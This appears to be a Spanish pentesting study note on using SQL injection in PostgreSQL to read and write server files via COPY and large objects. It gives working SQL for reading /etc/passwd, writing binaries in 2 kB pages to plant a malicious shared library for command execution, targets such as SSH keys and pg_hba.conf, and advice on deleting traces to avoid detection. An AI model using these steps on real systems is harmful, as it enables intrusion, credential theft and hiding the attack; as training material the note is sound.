---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Explotacion
Fecha de actualización: 2026-06-04
Nota previa: "[[07 - SQL Injection de segundo orden]]"
Nota siguiente: "[[09 - PostgreSQL ejecución de comandos]]"
Area: "[[SQL Injection.base|SQL Injection]]"
---
---

Con privilegios suficientes, una SQLi en PostgreSQL permite leer y escribir ficheros del servidor —el equivalente al [[07 - Lectura de archivos|`LOAD_FILE`/`INTO OUTFILE` de MySQL]] y al [[12 - MSSQL lectura de archivos|`OPENROWSET` de MSSQL]]—. Hay dos métodos: `COPY` (simple) y *large objects* (más potente, clave para [[09 - PostgreSQL ejecución de comandos|subir un binario y lograr RCE]]). <mark style="background: #FFB8EBA6;">Las operaciones corren como el usuario del SO `postgres`</mark>, así que los permisos de ese usuario limitan el alcance.

# Método 1: `COPY`

Pensado para importar/exportar tablas, sirve para leer y escribir cualquier fichero. Para **leer**, se copia el fichero a una tabla temporal:

```sql
CREATE TABLE tmp (t TEXT);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;
DROP TABLE tmp;
```

> [!warning]+
> `COPY` espera datos separados en columnas (delimitador `\t` por defecto), así que un fichero con tabulaciones (`/etc/hosts`) da `extra data after last expected column`. <mark style="background: #FFB86CA6;">La solución es cambiar el delimitador a un carácter improbable</mark>: `COPY tmp FROM '/etc/hosts' DELIMITER E'\x07';`.

Para **escribir**, `COPY TO` vuelca una tabla a un fichero:

```sql
CREATE TABLE tmp (t TEXT);
INSERT INTO tmp VALUES ('contenido a escribir');
COPY tmp TO '/tmp/proof.txt';
DROP TABLE tmp;
```

**Permisos**: superusuario, o los roles `pg_read_server_files` / `pg_write_server_files`. Se comprueba si somos superusuario (fácil en blind):

```sql
SELECT current_setting('is_superuser');   -- 'on' / 'off'
```

# Método 2: Large Objects

Más complejo pero más flexible, sobre todo para **binarios**. Para leer, `lo_import` carga el fichero como un *large object* (devuelve un OID) y `lo_get` lo recupera como hexstring:

```sql
SELECT lo_import('/etc/passwd');          -- devuelve p.ej. 16513
SELECT encode(lo_get(16513), 'hex');      -- lo_get devuelve bytea; encode -> hexstring (decodificar con: xxd -r -p)
```

Para **escribir** —el caso que habilita el RCE—, se crea un large object con OID conocido, se insertan los datos hex en `pg_largeobject` en páginas de **máximo 2 kB** (`LOBLKSIZE`) —un binario grande necesita varios `INSERT` con `pageno` incremental (0, 1, 2…)—, y se exporta a disco:

```sql
SELECT lo_create(31337);
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (31337, 0, DECODE('726f6f74...','HEX'));
SELECT lo_export(31337, '/tmp/archivo');
SELECT lo_unlink(31337);            -- limpieza
```

<mark style="background: #ADCCFFA6;">Esta es la vía para subir una librería compartida (`.so`) al servidor</mark> y cargarla como [[09 - PostgreSQL ejecución de comandos|extensión maliciosa]]. Si los `INSERT` fallan por permisos, `lo_put` es la alternativa. <mark style="background: #FFB8EBA6;">`lo_import`/`lo_export` requieren **superusuario**</mark> (no existe rol granular equivalente a `pg_read_server_files` para large objects).

> [!info]+
> **Comparativa de lectura/escritura de ficheros por motor** (todas requieren privilegios elevados, cada vez más restringidos):
> | Motor | Leer | Escribir |
> | ----- | ---- | -------- |
> | PostgreSQL | `COPY FROM`, `lo_import` | `COPY TO`, `lo_export` |
> | MySQL | `LOAD_FILE()` | `INTO OUTFILE` |
> | MSSQL | `OPENROWSET(BULK...)` | (vía `xp_cmdshell`/OLE) |

> [!warning]+
> **OPSEC**: usa siempre tablas temporales y **borra los rastros** (`DROP TABLE`, `lo_unlink`) — los large objects y tablas residuales quedan en la base de datos y delatan el ataque. Y recuerda: las operaciones de fichero están limitadas a los permisos del usuario `postgres` del SO, no a root.

> [!info]+
> **¿`COPY` o large objects?** Para **texto** (config, `/etc/passwd`, una web shell PHP), `COPY` es más simple y directo. Para **binarios** —el caso de subir una `.so` y lograr [[09 - PostgreSQL ejecución de comandos|RCE]]— los large objects son la vía, porque manejan el contenido byte a byte sin corromperlo. Ficheros de alto valor en PostgreSQL/Linux: `postgresql.conf` y `pg_hba.conf` (config y reglas de autenticación), `~postgres/.psql_history`, claves SSH, y el código de la app para volverla [[01 - Decompilación de archivos Java|caja blanca]].

La escritura de ficheros no es un fin en sí: combinada con las extensiones, lleva a la ejecución de comandos: [[09 - PostgreSQL ejecución de comandos]].
